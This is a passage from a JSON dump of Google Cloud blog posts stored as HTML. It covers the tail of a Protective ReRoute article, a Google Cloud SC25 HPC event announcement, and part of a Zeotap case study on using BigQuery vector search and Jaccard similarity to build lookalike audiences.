PRR for critical applications follow the guidance in the </span><a href=\"https://cloud.google.com/compute/docs/networking/tcp-optimization-for-network-performance-in-gcp-and-hybrid#use-prr-for-network-resiliency\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> and be ready to ensure the following:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Your VM runs a modern Linux kernel (4.20+).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Your applications use TCP.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The application traffic uses IPv6. For IPv4 protection, the application needs to use the gVNIC driver.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The availability of Protective ReRoute has profound implications for a variety of Google and Google Cloud users. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">For cloud customers with critical workloads:</strong><span style=\"vertical-align: baseline;\"> Evaluate and enable guest-mode PRR for applications that are sensitive to packet loss and that require the fastest recovery time, such as large-scale AI/ML jobs or real-time services.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">For network architects:</strong><span style=\"vertical-align: baseline;\"> Re-evaluate your network reliability architectures. Consider the benefits of designing for rich path diversity and empowering endpoints to intelligently route around failures, shifting your model from series to parallel reliability.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">For the open-source community:</strong><span style=\"vertical-align: baseline;\"> Recognize the power of host-level networking innovations. Contribute to and advocate for similar reliability features across all major operating systems to create a more resilient internet for everyone.</span></li>\n</ul>\n<hr />\n<p><sup><em><span style=\"vertical-align: baseline;\">1. <a href=\"https://dl.acm.org/doi/10.1145/3603269.3604867\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://dl.acm.org/doi/10.1145/3603269.3604867</span></a></span></em></sup></p></div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/hpc/accelerating-innovation-and-discovery-at-sc25/",
        "title": "Accelerating discovery at the speed of cloud: What’s New for HPC at Google Cloud for SC25",
        "thumbnail": null,
        "author": "Megan Gawlik",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With the pace of scientific discovery moving faster than ever, we’re excited to join the supercomputing community as it gets ready for its annual flagship event, </span><a href=\"https://sc25.supercomputing.org/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SC25</span></a><span style=\"vertical-align: baseline;\">, in St. Louis from November 16-21, 2025. There, we’ll share how Google Cloud is poised to help with our lineup of HPC and AI technologies and innovations, helping researchers, scientists, and engineers solve some of humanity's biggest challenges.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Redefining supercomputing with cloud-native HPC</strong></h3>\n<p><span style=\"vertical-align: baseline;\">S</span><span style=\"vertical-align: baseline;\">upercomputers are evolving from a rigid, capital-intensive resource into an adaptable, scalable service. To go from “HPC in the cloud” to “cloud-native HPC,” we leverage core principles of automation and elastic infrastructure to fundamentally change how you consume HPC resources, allowing you to spin up purpose-built clusters in minutes with the exact resources you need. </span></p>\n<p><span style=\"vertical-align: baseline;\">This cloud-native model is very flexible. You can augment an on-premises cluster to meet peak demand or build a cloud-native system tailored with the right mix of hardware for your specific problem — be it the latest CPUs, GPUs, or TPUs. With this approach, we’re democratizing HPC, putting world-class capabilities into the hands of startups, academics, labs, and enterprise teams alike. </span></p>\n<p><strong style=\"vertical-align: baseline;\">Key highlights at SC25:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Next-generation infrastructure: </strong><span style=\"vertical-align: baseline;\">We’ll be showcasing our latest </span><a href=\"https://docs.cloud.google.com/compute/docs/compute-optimized-machines#h4d_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">H4D VMs</span></a><span style=\"vertical-align: baseline;\">, powered by 5th generation AMD EPYC processors and featuring Cloud RDMA for low-latency networking. You’ll also see our latest accelerated compute resources including </span><a href=\"https://docs.cloud.google.com/compute/docs/accelerator-optimized-machines#a4x-vms\"><span style=\"text-decoration: underline; vertical-align: baseline;\">A4X</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/blog/products/compute/now-shipping-a4x-max-vertex-ai-training-and-more\"><span style=\"text-decoration: underline; vertical-align: baseline;\">A4X Max</span></a><span style=\"vertical-align: baseline;\"> VMs featuring the latest NVIDIA GPUs with RDMA.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Powering your essential applications: </strong><span style=\"vertical-align: baseline;\">Run your most demanding simulations at massive scale — from Computational Fluid Dynamics (CFD) with Ansys, to Computer-Aided Engineering with Siemens, computational chemistry with Schrodinger, and risk modeling in FSI.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Dynamic Workload Scheduler:</strong><span style=\"vertical-align: baseline;\"> Discover how </span><a href=\"https://cloud.google.com/products/dws/pricing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dynamic Workload Scheduler</span></a><span style=\"vertical-align: baseline;\"> and its innovative </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/dws\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Flex Start mode</span></a><span style=\"vertical-align: baseline;\">, integrated with familiar schedulers like Slurm, is reshaping HPC consumption. Move beyond static queues toward flexible, cost-effective, and efficient access to high-demand compute resources. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Easier HPC with Cluster Toolkit: </strong><span style=\"vertical-align: baseline;\">Learn how </span><a href=\"https://docs.cloud.google.com/cluster-toolkit/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cluster Toolkit</span></a><span style=\"vertical-align: baseline;\"> can help you deploy a supercomputer-scale cluster with less than 50 lines of code.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">High-throughput, scalable storage:</strong><span style=\"vertical-align: baseline;\"> Get a deep dive into </span><a href=\"https://cloud.google.com/products/managed-lustre\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Managed Lustre</span></a><span style=\"vertical-align: baseline;\">, a fully managed, high-performance parallel file system that can handle your most demanding HPC and AI workloads.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hybrid for the enterprise: </strong><span style=\"vertical-align: baseline;\">For our enterprise customers, especially in financial services, we're enabling hybrid cloud with </span><a href=\"https://docs.cloud.google.com/compute/docs/instances/ibm-symphony\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IBM Spectrum Symphony Connectors</span></a><span style=\"vertical-align: baseline;\">, allowing you to migrate or burst workloads to Google Cloud and reduce time-to-solution.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">AI-powered scientific discovery</strong></h3>\n<p><span style=\"vertical-align: baseline;\">There’s a powerful synergy between HPC and AI — where HPC builds more powerful AI, and AI makes HPC faster and more insightful. This complementary relationship is fundamentally changing how research is done, accelerating discovery in everything from drug development and climate modeling to new materials and engineering. At Google Cloud, we’re at the forefront of this transformation, building the models, tools, and platforms that make it possible. </span></p>\n<p><strong style=\"vertical-align: baseline;\">What to look for: </strong></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">AI for scientific productivity: </strong><span style=\"vertical-align: baseline;\">We’ll be showcasing Google’s suite of AI tools designed to enhance the entire research lifecycle. From </span><a href=\"https://cloud.google.com/agentspace/docs/idea-generation\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Idea Generation agent</span></a><span style=\"vertical-align: baseline;\"> to </span><a href=\"https://codeassist.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Code Assist</span></a><span style=\"vertical-align: baseline;\"> with </span><a href=\"https://cloud.google.com/gemini-enterprise?_gl=1*9qpvwe*_up*MQ..&amp;gclid=EAIaIQobChMIptGF-7qrkAMVRyvUAR0VwSw1EAAYASAAEgIZMPD_BwE&amp;gclsrc=aw.ds#module-7\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">, you’ll see how AI can augment your capabilities and accelerate discovery. </span></li>\n<li><strong style=\"vertical-align: baseline;\">AI-powered scientific applications: </strong><span style=\"vertical-align: baseline;\">Learn about the latest advancements in our AI-powered scientific applications including AlphaFold 3 and Weather Next</span></li>\n<li><strong style=\"vertical-align: baseline;\">The power of TPUs:</strong><span style=\"vertical-align: baseline;\"> Explore Google's </span><a href=\"https://cloud.google.com/tpu\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TPUs</span></a><span style=\"vertical-align: baseline;\">, including the latest seventh-generation </span><a href=\"https://cloud.google.com/blog/products/compute/ironwood-tpus-and-new-axion-based-vms-for-your-ai-workloads\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Ironwood</span></a><span style=\"vertical-align: baseline;\"> model, and discover how they can enhance AI workload performance and efficiency.</span></li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Join the Google Cloud at SC25: </strong><span style=\"vertical-align: baseline;\">At Google Cloud, we believe the cloud is the supercomputer of the future. From purpose-built HPC and AI infrastructure to quantum breakthroughs and simplified open-source tools, let Google Cloud be the platform for your next discovery.</span></p>\n<p><span style=\"vertical-align: baseline;\">We invite you to connect with our experts and learn more. Join the </span><a href=\"https://sites.google.com/view/advancedcomputingcommunity/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Advanced Computing Community</span></a><span style=\"vertical-align: baseline;\"> to engage in discussions with our partners and the broader HPC, AI, and quantum communities.</span></p>\n<p><span style=\"vertical-align: baseline;\">We can’t wait to see what you discover.</span></p>\n<p><strong style=\"vertical-align: baseline;\">See us at the show:</strong></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Visit us in booth #3724: </strong><span style=\"vertical-align: baseline;\">Stop by for live demos of our latest HPC and AI solutions, including Dynamic Workload Scheduler, Cluster Toolkit, our latest AI agents, and even see our TPUs. Our team of experts will be on hand to answer your questions and discuss how Google Cloud can meet your needs.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Attend our technical talks:</strong><span style=\"vertical-align: baseline;\"> Keep an eye on </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-sc-25\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our SC25 schedule</span></a><span style=\"vertical-align: baseline;\"> for Google Cloud presentations and technical talks, where our leaders and partners will share deep dives, insights, and best practices.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Passport program: </strong><span style=\"vertical-align: baseline;\">Grab a passport card from the Google booth and visit our demos, labs, and talks to collect stamps and learn about how we’re working with organizations across the HPC ecosystem to democratize HPC. Come back to the Google booth with your completed passport card to choose your prize!</span></li>\n<li><strong style=\"vertical-align: baseline;\">Play a game:</strong><span style=\"vertical-align: baseline;\"> Join us in the Google booth and at our events to enjoy some Gemini-driven games — test your tech trivia knowledge or compete head-to-head with others to build the best LEGO creation!</span></li>\n<li><strong style=\"vertical-align: baseline;\">Join our community kickoff: </strong><span style=\"vertical-align: baseline;\">Are you a member of the Google Cloud Advanced Computing Community? Secure your spot today for our </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-advanced-computing-community-sc25\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SC25 Kickoff Happy Hour</span></a><span style=\"vertical-align: baseline;\">!</span></li>\n<li><strong style=\"vertical-align: baseline;\">Celebrate with NVIDIA and Google Cloud: </strong><span style=\"vertical-align: baseline;\">We’re proud to co-host a </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-nvidia-sc25\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reception with NVIDIA</span></a><span style=\"vertical-align: baseline;\">, and we look forward to toasting another year of innovation with our customers and partners. Register today to secure your spot!</span></li>\n</ul></div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/using-bigquery-ml-to-solve-for-the-lookalike-problem-at-zeotap/",
        "title": "Zeotap: How BigQuery ML and vector search help customers build their own AI models",
        "thumbnail": null,
        "author": "Sathish KS",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor’s note:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> The post is part of a series that highlights how organizations leverage Google Cloud’s unique data science capabilities over alternative cloud data platforms. Google Cloud's vector embedding generation and search features are unique for their end-to-end, customizable platform that leverages Google's advanced AI research, offering features like task-optimized embedding models and hybrid search to deliver highly relevant results for both semantic and keyword-based queries.</span></p>\n<hr />\n<p><span style=\"vertical-align: baseline;\">Zeotap’s customer intelligence platform (CIP) helps brands understand their customers and predict behaviors, so that they can improve customer engagement. Zeotap partners with Google Cloud to build a customer data platform that offers privacy, security, and compliance. Zeotap CIP, built with BigQuery, enables digital marketers to build and use AI/ML models to predict customer behavior and personalize the customer experienc</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_t03FFBt.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The Zeotap platform includes a customer segmentation feature called lookalike audience extensions. A lookalike audience is a group of new potential customers identified by machine learning algorithms who share similar characteristics and behaviors with an existing, high-value customer base. However, sparse or incomplete first-party data can make it hard to create effective lookalike audiences, preventing advertising algorithms from accurately identifying the key characteristics of valuable customers that they need to find similar new prospects. For such rare features, Zeotap uses multiple machine learning (ML) methodologies that combine </span><a href=\"http://papers.adkdd.org/2021/papers/adkdd21-selvaraj-multigraph.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Zeotap’s multigraph algorithm</span></a><span style=\"vertical-align: baseline;\"> and high-quality data assets to more accurately extend customers’ audiences between the CDP and lookalike models.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this blog, we dive into how Zeotap uses BigQuery, including BigQuery ML and Vector Search to solve the end-to-end lookalike problem. </span><span style=\"vertical-align: baseline;\">By taking a practical approach, we transformed a complex nearest-neighbour problem into a simple inner-join problem, overcoming challenges of cost, scale and performance without a specialized vector database. </span><span style=\"vertical-align: baseline;\">We break down each step of the workflow, from data preparation to serving, highlighting how BigQuery addresses core challenges along the way. We illustrate one of the techniques, Jaccard similarity with embeddings, to address the low-cardinality categorical columns that dominate user-profile datasets. </span></p>\n<p><span style=\"vertical-align: baseline;\">The high-level flow is as follows, and happens entirely within the BigQuery ecosystem. Note: In this blog, we will not be covering the flow of high-cardinality columns.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_viuso9A.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Jaccard similarity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Among a couple of other similarity indexes, which return the most similar vector that are closest in embedding space, Zeotap prefers the Jaccard similarity to be a fitting index for low-cardinality features, which is a measure of overlap between two sets with a simple formula: </span><span style=\"vertical-align: baseline;\">(A </span><span style=\"vertical-align: baseline;\">B) / (A</span><span style=\"vertical-align: baseline;\">B)</span><span style=\"vertical-align: baseline;\">. The Jaccard similarity</span><span style=\"vertical-align: baseline;\"> answers the question, \"Of all the unique attributes present in either of the two users, what percentage of them are shared?\" It only cares about the features that are present in at least one of the entities (e.g., the 1s in a binary vector) and ignores attributes that are absent in both.</span></p>\n<p><span style=\"vertical-align: baseline;\">To visualise:</span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Users</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Interests</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Binary Vectors[Movie, Sport, Music, Books, Travel]</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">X∩B</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Jaccard similarity with X</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">X</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[Movie, Sport]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[1,1,0,0,0]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">-</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">-</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Y</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[Movie, Sport]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[1,1,0,0,0]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2/2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Z</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[Movie, Sport, Music, Books, Travel]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[1,1,1,1,1]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2/5</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p><span style=\"vertical-align: baseline;\">Jaccard similarity shines because it is simple and easily explainable over many other complex distance metrics and similarity indexes that only measure distance in the embeddings space — a real Occam’s razor, as it were. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Implementation blueprint</strong></h3>\n<p><strong style=\"vertical-align: baseline;\">Generating the vector embeddings<br /></strong><span style=\"vertical-align: baseline;\">After selecting the low-cardinality features, we </span><span style=\"vertical-align: baseline;\">create our vectors </span><span style=\"vertical-align: baseline;\">using BigQuery </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-one-hot-encoder?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">one-hot encoding</span></a><span style=\"vertical-align: baseline;\"> and</span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-multi-hot-encoder?hl=en\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">multi-hot encoding</span></a><span style=\"vertical-align: baseline;\"> for primitive and array-based columns. </span></p>\n<p><span style=\"vertical-align: baseline;\">Again, it helps to visualize a sample vector table:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_HYyDAga.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Challenge: Jaccard distance is not directly supported in BigQuery vector search!</strong></p>\n<p><span style=\"vertical-align: baseline;\">BigQuery vector search supports three distance types: </span><a href=\"https://en.wikipedia.org/wiki/Euclidean_distance\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Euclidean</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://en.wikipedia.org/wiki/Cosine_similarity#Cosine_distance\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cosine</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://en.wikipedia.org/wiki/Dot_product\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dot product</span></a><span style=\"vertical-align: baseline;\">, but not Jaccard distance — at least not natively. However, we can represent the choice of binary vectors where the Jaccard Distance (1 - Jaccard Similarity)  as: </span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Jd(A,B) = 1 - |A∩B|/|A∪B| = (|A∪B| - |A∩B|)/|A∪B|</span></p>\n<p><span style=\"vertical-align: baseline;\">Using only the dot product, this can be rewritten as:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--medium\n      \n      \n        h-c-grid__col\n        \n        h-c-grid__col--4 h-c-grid__col--offset-4\n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_6ZFqrE0.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">So we can, in fact, arrive at the Jaccard distance using the dot product. We found BigQuery’s out-of-the-box </span><strong style=\"vertical-align: baseline;\">LP_NORM</strong><span style=\"vertical-align: baseline;\"> function for calculating the</span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-lp-norm?hl=en\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">Manhattan</span></a><span style=\"vertical-align: baseline;\"> norm useful, as the </span><strong style=\"vertical-align: baseline;\">Manhattan norm for a binary vector is the dot product with itself</strong><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">In other words, using the Manhattan norm function, we found that we can support the Jaccard distance in a way that it can be calculated using the supported \"dot product\" search in BigQuery. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Building the vector index</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Next, we needed to build our vector index. BigQuery supports two primary vector index types: </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index#ivf-index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IVF</span></a><span style=\"vertical-align: baseline;\"> (Inverted File Index) and </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index#tree-ah-index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TREE_AH</span></a><span style=\"vertical-align: baseline;\"> (Tree with Asymmetric Hashing), each tailored to different scenarios. </span><span style=\"vertical-align: baseline;\">The </span><span style=\"vertical-align: baseline;\">TREE_AH</span><span style=\"vertical-align: baseline;\"> vector index type combines a tree-like structure with asymmetric hashing (</span><span style=\"vertical-align: baseline;\">AH</span><span style=\"vertical-align: baseline;\">), based on</span><a href=\"https://github.com/google-research/google-research/blob/master/scann/docs/algorithms.md\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">Google’s ScaNN algorithm</span></a><span style=\"vertical-align: baseline;\">, which has performed exceptionally well on various</span><a href=\"https://ann-benchmarks.com/index.html\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">ANN benchmarks</span></a><span style=\"vertical-align: baseline;\">. Also, since the use case was for large batch queries (e.g., hundreds of thousands to millions of users), this offered reduced latency and cost compared to alternate vector databases.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Lookalike delivery</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Once we had a vector index to optimize searches, we asked ourselves, “Should we run our searches directly using the </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/search_functions#vector_search\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VECTOR_SEARCH</span></a><span style=\"vertical-align: baseline;\"> function in BigQuery?” Taking this approach over the base table yielded a whopping 118 million user-encoded vectors for just one client! Additionally, and most importantly, since this computation called for a </span><a href=\"https://en.wikipedia.org/wiki/Cartesian_product\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cartesian product</span></a><span style=\"vertical-align: baseline;\">, our in-memory data sizes became very large and complex quickly. We needed to devise a strategy that would scale to all customers.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The rare feature strategy</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A simple but super-effective strategy is to </span><strong style=\"vertical-align: baseline;\">avoid searching for ubiquitous user features. </strong><span style=\"vertical-align: baseline;\">In a two-step rare-feature process, we identify the “omnipresent” features, then proceed to create a signal-rich table that includes users who possess at least one of the rarer/discriminative features. Right off the bat, we achieved up to 78% reduction in search space. BigQuery VECTOR_SEARCH allows you to do this with </span><strong style=\"vertical-align: baseline;\">pre-filtering, </strong><span style=\"vertical-align: baseline;\">wherein you use a subquery to dynamically shrink the search space. The catch is that the subquery cannot be a classic join, so we introduce a “flag” column and make it part of the index. </span><strong style=\"vertical-align: baseline;\">Note:</strong><span style=\"vertical-align: baseline;\"> If a column is not stored in the index, then the WHERE clause in the VECTOR_SEARCH will execute a </span><a href=\"https://docs.cloud.google.com/bigquery/docs/vector-index#pre-filters_and_post-filters\"><span style=\"text-decoration: underline; vertical-align: baseline;\">post-filter</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_zdPwyaH.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Use the BQUI or system tables to see if a vector is used to accelerate queries</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Batch strategy</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Vector search compares query users (N, the users we’re targeting) against base users (M, the total user pool, in this case 118M). The complexity increases with (M × N), making large-scale searches resource-intensive. To manage this, we applied batches to the N query users, processing them in groups (e.g., 500,000 per batch), while M remained the full base set. This approach reduced the computational load, helping to efficiently match the top 100 similar users for each query user.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">We then used grid search to determine the optimal batch size for high-scale requirements.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">To summarize</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We partnered with Google Cloud to enable digital marketers to build and use AI/ML models for customer segmentation and personalized experiences, driving higher conversion rates and lower acquisition costs. We addressed the challenge of Jaccard distance not being directly supported in BigQuery 